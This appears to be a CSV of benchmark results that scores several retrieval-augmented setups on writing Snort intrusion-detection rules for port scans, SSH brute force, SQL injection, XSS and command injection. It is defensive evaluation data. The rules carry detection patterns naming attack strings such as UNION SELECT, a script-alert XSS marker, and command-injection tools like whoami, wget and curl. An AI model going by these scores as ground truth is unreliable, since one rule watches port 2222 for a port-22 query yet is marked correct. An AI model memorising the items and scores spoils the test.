query,expected_attack_type,architecture,predicted_attack_type,attack_type_correct,valid_rule_or_benign,retrieval_hit_at_3,option_coverage,hallucination_risk,generated_rule
Detect a TCP SYN port scan against our web server with many ports touched in one minute,port_scan,baseline,port_scan,True,True,False,0.6666666666666666,0.35,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""LOCAL PORT SCAN detected""; flags:S; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:9051523; rev:1;)"
Detect a TCP SYN port scan against our web server with many ports touched in one minute,port_scan,rag_classic,port_scan,True,True,True,0.6666666666666666,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 Port scan repeated SYN 6""; flags:S; detection_filter:track by_src,count 11,seconds 8; classtype:attempted-recon; sid:9100006; rev:1;)"
Detect a TCP SYN port scan against our web server with many ports touched in one minute,port_scan,rag_rerank,port_scan,True,True,True,0.6666666666666666,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 Port scan repeated SYN 6""; flags:S; detection_filter:track by_src,count 11,seconds 8; classtype:attempted-recon; sid:9100006; rev:1;)"
Detect a TCP SYN port scan against our web server with many ports touched in one minute,port_scan,rag_hybrid,port_scan,True,True,True,0.6666666666666666,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 Port scan repeated SYN 6""; flags:S; detection_filter:track by_src,count 11,seconds 8; classtype:attempted-recon; sid:9100006; rev:1;)"
Detect a TCP SYN port scan against our web server with many ports touched in one minute,port_scan,multi_hop,port_scan,True,True,True,0.6666666666666666,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 Port scan repeated SYN 6""; flags:S; detection_filter:track by_src,count 11,seconds 8; classtype:attempted-recon; sid:9100006; rev:1;)"
Detect a TCP SYN port scan against our web server with many ports touched in one minute,port_scan,graph_rag,port_scan,True,True,True,0.6666666666666666,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 Port scan repeated SYN 1""; flags:S; detection_filter:track by_src,count 10,seconds 6; classtype:attempted-recon; sid:9100001; rev:1;)"
Detect a TCP SYN port scan against our web server with many ports touched in one minute,port_scan,agentic_rag,port_scan,True,True,True,0.6666666666666666,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 Port scan repeated SYN 6""; flags:S; detection_filter:track by_src,count 11,seconds 8; classtype:attempted-recon; sid:9100006; rev:1;)"
Generate a Snort rule for repeated SSH brute force attempts on port 22,ssh_bruteforce,baseline,ssh_bruteforce,True,True,False,0.7777777777777778,0.35,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""LOCAL SSH BRUTEFORCE detected""; flow:to_server; flags:S; detection_filter:track by_src, count 8, seconds 60; classtype:attempted-admin; sid:9870383; rev:1;)"
Generate a Snort rule for repeated SSH brute force attempts on port 22,ssh_bruteforce,rag_classic,ssh_bruteforce,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""P1 SSH brute force repeated login failures 3""; flow:to_server,established; content:""SSH-""; detection_filter:track by_src,count 8,seconds 60; classtype:attempted-admin; sid:9100023; rev:1;)"
Generate a Snort rule for repeated SSH brute force attempts on port 22,ssh_bruteforce,rag_rerank,ssh_bruteforce,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""P1 SSH brute force repeated login failures 3""; flow:to_server,established; content:""SSH-""; detection_filter:track by_src,count 8,seconds 60; classtype:attempted-admin; sid:9100023; rev:1;)"
Generate a Snort rule for repeated SSH brute force attempts on port 22,ssh_bruteforce,rag_hybrid,ssh_bruteforce,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""P1 SSH brute force repeated login failures 3""; flow:to_server,established; content:""SSH-""; detection_filter:track by_src,count 8,seconds 60; classtype:attempted-admin; sid:9100023; rev:1;)"
Generate a Snort rule for repeated SSH brute force attempts on port 22,ssh_bruteforce,multi_hop,ssh_bruteforce,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""P1 SSH brute force repeated login failures 3""; flow:to_server,established; content:""SSH-""; detection_filter:track by_src,count 8,seconds 60; classtype:attempted-admin; sid:9100023; rev:1;)"
Generate a Snort rule for repeated SSH brute force attempts on port 22,ssh_bruteforce,graph_rag,ssh_bruteforce,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 2222 (msg:""P1 SSH brute force repeated login failures 1""; flow:to_server,established; content:""SSH-""; detection_filter:track by_src,count 6,seconds 60; classtype:attempted-admin; sid:9100021; rev:1;)"
Generate a Snort rule for repeated SSH brute force attempts on port 22,ssh_bruteforce,agentic_rag,ssh_bruteforce,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""P1 SSH brute force repeated login failures 3""; flow:to_server,established; content:""SSH-""; detection_filter:track by_src,count 8,seconds 60; classtype:attempted-admin; sid:9100023; rev:1;)"
Détecter une injection SQL UNION SELECT dans une URL HTTP,sql_injection,baseline,sql_injection,True,True,False,0.8888888888888888,0.35,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL SQL INJECTION detected""; flow:to_server,established; content:""select%20""; http_uri; nocase; classtype:web-application-attack; sid:9602343; rev:1;)"
Détecter une injection SQL UNION SELECT dans une URL HTTP,sql_injection,rag_classic,sql_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 SQL injection payload 1""; flow:to_server,established; content:""UNION SELECT""; nocase; classtype:web-application-attack; sid:9100041; rev:1;)"
Détecter une injection SQL UNION SELECT dans une URL HTTP,sql_injection,rag_rerank,sql_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 SQL injection payload 1""; flow:to_server,established; content:""UNION SELECT""; nocase; classtype:web-application-attack; sid:9100041; rev:1;)"
Détecter une injection SQL UNION SELECT dans une URL HTTP,sql_injection,rag_hybrid,sql_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 SQL injection payload 16""; flow:to_server,established; content:""union select null""; nocase; classtype:web-application-attack; sid:9100056; rev:1;)"
Détecter une injection SQL UNION SELECT dans une URL HTTP,sql_injection,multi_hop,sql_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 SQL injection payload 16""; flow:to_server,established; content:""union select null""; nocase; classtype:web-application-attack; sid:9100056; rev:1;)"
Détecter une injection SQL UNION SELECT dans une URL HTTP,sql_injection,graph_rag,sql_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 SQL injection payload 1""; flow:to_server,established; content:""UNION SELECT""; nocase; classtype:web-application-attack; sid:9100041; rev:1;)"
Détecter une injection SQL UNION SELECT dans une URL HTTP,sql_injection,agentic_rag,sql_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 SQL injection payload 16""; flow:to_server,established; content:""union select null""; nocase; classtype:web-application-attack; sid:9100056; rev:1;)"
Detect XSS attack where the URI contains <script>alert(1)</script>,xss,baseline,xss,True,True,False,0.8888888888888888,0.35,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL XSS detected""; flow:to_server,established; content:""<script""; http_uri; nocase; classtype:web-application-attack; sid:9193888; rev:1;)"
Detect XSS attack where the URI contains <script>alert(1)</script>,xss,rag_classic,xss,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 XSS payload marker 1""; flow:to_server,established; content:""<script>alert(1)</script""; nocase; pcre:""/\<script\>alert(1)\<\/script\>/i""; classtype:web-application-attack; sid:9100061; rev:1;)"
Detect XSS attack where the URI contains <script>alert(1)</script>,xss,rag_rerank,xss,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 XSS payload marker 1""; flow:to_server,established; content:""<script>alert(1)</script""; nocase; pcre:""/\<script\>alert(1)\<\/script\>/i""; classtype:web-application-attack; sid:9100061; rev:1;)"
Detect XSS attack where the URI contains <script>alert(1)</script>,xss,rag_hybrid,xss,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 XSS payload marker 1""; flow:to_server,established; content:""<script>alert(1)</script""; nocase; pcre:""/\<script\>alert(1)\<\/script\>/i""; classtype:web-application-attack; sid:9100061; rev:1;)"
Detect XSS attack where the URI contains <script>alert(1)</script>,xss,multi_hop,xss,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 XSS payload marker 1""; flow:to_server,established; content:""<script>alert(1)</script""; nocase; pcre:""/\<script\>alert(1)\<\/script\>/i""; classtype:web-application-attack; sid:9100061; rev:1;)"
Detect XSS attack where the URI contains <script>alert(1)</script>,xss,graph_rag,xss,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 XSS payload marker 1""; flow:to_server,established; content:""<script>alert(1)</script""; nocase; pcre:""/\<script\>alert(1)\<\/script\>/i""; classtype:web-application-attack; sid:9100061; rev:1;)"
Detect XSS attack where the URI contains <script>alert(1)</script>,xss,agentic_rag,xss,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 XSS payload marker 1""; flow:to_server,established; content:""<script>alert(1)</script""; nocase; pcre:""/\<script\>alert(1)\<\/script\>/i""; classtype:web-application-attack; sid:9100061; rev:1;)"
Detect command injection with cmd parameter and whoami in HTTP request,command_injection,baseline,command_injection,True,True,False,0.8888888888888888,0.35,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL COMMAND INJECTION detected""; flow:to_server,established; content:""cmd=""; http_uri; content:"";""; http_uri; pcre:""/(whoami|id|wget|curl)/Ui""; classtype:web-application-attack; sid:9330310; rev:1;)"
Detect command injection with cmd parameter and whoami in HTTP request,command_injection,rag_classic,command_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Command injection payload 19""; flow:to_server,established; content:""|cmd.exe /c whoami""; nocase; classtype:web-application-attack; sid:9100099; rev:1;)"
